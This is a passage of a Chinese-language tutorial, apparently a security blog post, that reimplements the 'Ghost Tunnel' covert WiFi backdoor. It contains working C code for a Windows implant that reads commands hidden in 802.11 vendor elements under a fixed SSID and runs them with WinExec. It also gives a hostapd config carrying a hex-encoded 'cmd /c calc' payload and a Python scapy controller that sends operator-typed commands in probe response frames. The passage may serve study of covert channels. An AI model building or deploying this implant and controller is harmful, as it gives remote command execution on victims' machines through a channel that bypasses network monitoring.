                        {
                            WLAN_BSS_ENTRY *bss_entry = &ppWlanBssList->wlanBssEntries[z];
                            //添加判断是否来自控制端——yunsle_ghost_tunnel
                            if (stricmp((char *)bss_entry->dot11Ssid.ucSSID, "yunsle_ghost_tunnel") == 0) {
                                printf("找到控制端!n");
                                char *pp = (char *)((unsigned long)bss_entry + bss_entry->ulIeOffset);
                                int total_size = bss_entry->ulIeSize;
                                //printf("长度：%d",total_size);
                                for (;;) {
                                    ie_data * ie = (struct ie_data *)pp;
                                    if ((int)ie->id == 221)
                                    {
                                        //printf("221!!!!!n");
                                        // eg. "ccccmd /c notepad"  
                                        char *magic = (char *)&ie->val[0];
                                        printf(magic);
                                        printf("n");
                                        if (strncmp(magic, "ccc", 3) == 0)
                                        {
                                            char command[240] = { 0 };
                                            strncpy(command, magic + 3, ie->len - 3);
                                            //执行命令
                                            printf("提取命令：%sn",command);
                                            WinExec(command, SW_NORMAL);
                                            exit(1); //退出
                                            break;
                                        }
                                    }
                                    pp += sizeof(struct ie_data) - 1 + (int)ie->len;
                                    total_size -= sizeof(struct ie_data) - 1 + (int)ie->len;
                                    if  (!total_size)
                                    {
                                        break;  // over  
                                    }
                                }
                            }
                        }
                //        wprintf(L"n");
                    }
                }
            }
            //间隔
            Sleep(3000);
        }
        if (pBssList != NULL) {
            WlanFreeMemory(pBssList);
            pBssList = NULL;
        }
        if (pIfList != NULL) {
            WlanFreeMemory(pIfList);
            pIfList = NULL;
        }
        return 0;
    }
## 0x03 GhostTunnel的控制端——Hostapd
控制端程序要完成的功能：  
1、监听Probe Request请求，监听到包含特殊标记”command ok!!!!!!.”的请求则进行处理。  
2、将要执行的指令通过Probe Request或Beacon帧形式发送
首先尝试使用Hostapd进行简单实现，Hostapd是一个Linux下将无线网卡作为热点提供Wifi的神器  
在这里，它也能够作为控制端——可以发送添加自定义内容的Beacon帧
需要注意，如果Ubuntu或者Kali碰到Hostapd开启失败的情况：
    nl80211: Could not configure driver mode  
    nl80211 driver initialization failed.  
    hostapd_free_hapd_data: Interface wlan0 wasn't started
可以尝试以下命令解决：
    #改变NetworkManager里的状态,关闭wifi，同时软锁定
    nmcli nm wifi off
    #启用wifi设备，不同于网络状态中的启用wifi(后者改变NetworkManager里的状态)
    sudo rfkill unblock wlan
hostapd的配置文件——hostapd.conf:
    interface=wlan0    监听wlan0设备
    #driver=n180211    可以注释掉，自动选择
    ssid=yunsle_ghost_tunnel   wifi的ssid名称
    hw_mode=g    802.11/g模式
    channel=1    信道1
    auth_algs=1  
    #附加数据，回应probe response
    #dd是标识，0e是后面命令的长度，0e之后是ccccmd /c calc的16进制表示（CCC是掩码标识）
    vendor_elements=dd0e636363636d64202f632063616c63
开启被控端后，执行hostapd -t hostapd.conf的效果：
## 0x04 GhostTunnel的控制端——Python scapy
使用hostapd终究不是自己定制化的，但是Linux下针对Wifi是较为复杂的C编程，同时又要查很多API  
这时候想到Python的scapy库，之前用它作为抓包工具，印象中也可以构造很多类型的包进行发送，于是使用scapy开始尝试
在这种解决方案下，需要手动开启无线网卡的混杂模式，这样才能通过scapy正常抓到802.11的所有包，开启无线网卡混杂模式的方法有很多:
  1. 使用iwconfig，先ifconfig wlan0 down，然后iwconfig wlan0 mode monitor设置混杂模式，最后ifconfig wlan0 up即可。
  2. 使用airodump-ng wlan0也可以直接将wlan0设置为混杂模式。
Python使用scapy实现的功能逻辑很简单：  
sniff函数监听wlan0上所有数据，包含特殊标记”command ok!!!!!!.”则提示输入执行的命令，最后发送响应到被控端。
python代码如下(python2.7)：
    #coding:utf-8
    from scapy.all import *
    import binascii
    #设置ssid和监听设备名
    netSSID = 'yunsle_ghost_tunnel'       #Network name here
    iface = 'wlan0'         #Interface name here
    #设置发送的帧数据
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID',info=netSSID, len=len(netSSID))
    #处理控制函数
    def handle(packet):
        dot = packet.getlayer(Dot11)
        if dot!=None and dot.type==0 and dot.subtype==4:
            data=str(packet)
            if data.find("command")>=0:
                # packet.show()
                print "#wake up#n"
                #获取上线被控端的MAC地址
                ct_addr2 = packet.addr2
                #要执行的命令
                cmd = raw_input("input the command to excute:n")
                # cmd = "cmd /c notepad"
                #处理命令编码
                cmd_b = ""
                for i in cmd:
                    cmd_b += binascii.a2b_hex(hex(ord(i))[2:4])
                print cmd_b
                payload = Dot11Elt(ID=221, info=('x63x63x63'+cmd_b))
                #beacon_dot11 = Dot11(type=0, subtype=5, addr1=ct_addr2,
                #addr2='22:22:22:22:22:22', addr3='33:33:33:33:33:33')
                response_dot11 = Dot11(subtype=5, addr1=ct_addr2,
                addr2='22:22:22:22:22:22', addr3='33:33:33:33:33:33',SC=22222)
                response_frame = RadioTap()/response_dot11/Dot11ProbeResp()/Dot11Elt(ID='SSID', info="yunsle_ghost_tunnel")/payload
                #发送3次，每次300包
                for i in range(0,3):
                    sendp(response_frame, iface=iface, count=300)
                exit(1)
    if __name__ == "__main__":
        print "waiting for wake up......."
        #监听函数
        sniff(iface=iface, prn=handle)
效果：
* * *
## 0x05 参考资料和过坑指南
    https://msdn.microsoft.com/zh-cn/library/ms706716
    WlanEnumInterfaces function函数介绍包括示例代码
    https://msdn.microsoft.com/en-us/library/ms706274(v=vs.85).aspx
    Native Wifi Functions
    https://blog.csdn.net/liu_si_yan/article/details/80268937
    基于Ghost Tunnel的实践，大概思路引导
    http://www.freebuf.com/articles/wireless/171108.html
    freebuf上的源地址
    https://blog.csdn.net/qq_20448859/article/details/54131187
    Hostapd在ubuntu下的安装
    https://blog.csdn.net/perry_peng/article/details/6067590
    使用汇编使用Native Wifi API的大牛
    https://www.jianshu.com/p/c3a8abc8f329
    Kali安装HostAPd
    https://blog.csdn.net/gsls200808/article/details/39370597
    hostapd无法启动热点问题解决（非网卡不支持）
    https://zhoujianshi.github.io/articles/2016/%E6%9E%84%E9%80%A0%E5%B9%B6%E5%8F%91%E9%80%81Beacon%E5%B8%A7%E4%BB%A5%E4%BC%AA%E9%80%A0%E4%BB%BB%E6%84%8FWiFi%E7%83%AD%E7%82%B9/index.html
    Linux下使用C写的发送Beacon帧
    https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/
    使用Python的scapy发送Beacon帧
    问题与解决：
    nl80211: Could not configure driver mode  
    nl80211 driver initialization failed.  
    hostapd_free_hapd_data: Interface wlan0 wasn't started  
    解决方法:
    #改变NetworkManager里的状态,关闭wifi，同时软锁定
    sudo nmcli nm wifi off   
    #启用wifi设备，不同于网络状态中的启用wifi(后者改变NetworkManager里的状态)
    sudo rfkill unblock wlan  
    # iw dev wlan0 interface add mon0 type monitor# ifconfig mon0 up
    直接使用airodump-ng wlan0时airodump-ng也会将wlan0设置为监听模式